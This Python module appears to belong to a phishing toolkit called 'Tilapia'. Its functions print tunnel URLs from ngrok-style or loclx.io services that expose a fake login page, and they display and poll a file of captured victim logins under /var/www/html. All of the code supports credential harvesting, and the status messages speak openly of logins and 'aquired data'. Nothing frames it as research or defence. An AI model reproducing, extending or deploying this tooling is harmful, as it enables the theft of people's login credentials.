#!usr/bin/env python3
import os
import json
import time
from termcolor import colored
import urllib.request
####FILES########################################################################
def users():
    os.system("clear")
    print("Data captured this session:\n")
    try:
        with open("/var/www/html/user.txt", "r") as user:
            u = user.read()
            print(u)
            user.close()
    except FileNotFoundError:
        print(" ")
    try:
        input("Press enter to continue")
    except (NameError, SyntaxError):
        pass
    os.system("clear")
def safeData():
    os.system("clear")
    print("Safe:\n")
    try:
        with open("safe.txt", "r") as safe:
            s = safe.read()
            print(s)
            safe.close()
    except FileNotFoundError:
        print(" ")
    try:
        input("Press enter to continue")
    except (NameError, SyntaxError):
        pass
    os.system("clear")
def getUrl():
    with open('shell/tunnel.json') as data_file:
        datajson = json.load(data_file)
    msg = "Generated URL's:"
    pub = ""
    for i in datajson['tunnels']:
        pub += "\n" + i['public_url']
    if pub == "":
        msg = "err"
        return msg
    msg = msg + " " + colored(pub, "cyan") + "\n\nLogins will show here and save to safe.txt when you close Tilapia\nYou can also check aquired data from the main menu"
    return msg
def getLocURL(method):
    url = "https://%s.loclx.io" %method
    msg = "Generated URL's:\n"
    msg += "http://%s.loclx.io\n" %method
    msg += "https://%s.loclx.io" %method
    msg = msg + " " + "\n\nLogins will show here and save to safe.txt when you close Tilapia\nYou can also check aquired data from the main menu"
    try:
        code = urllib.request.urlopen(url)
    except:
        return "err"
    return msg
def getDone():
    try:
        with open("/var/www/html/user.txt") as data:
            while True:
                time.sleep(5)
                s = data.read()
                print(s, end="\r")
    except (KeyboardInterrupt, FileNotFoundError):
        pass

















#
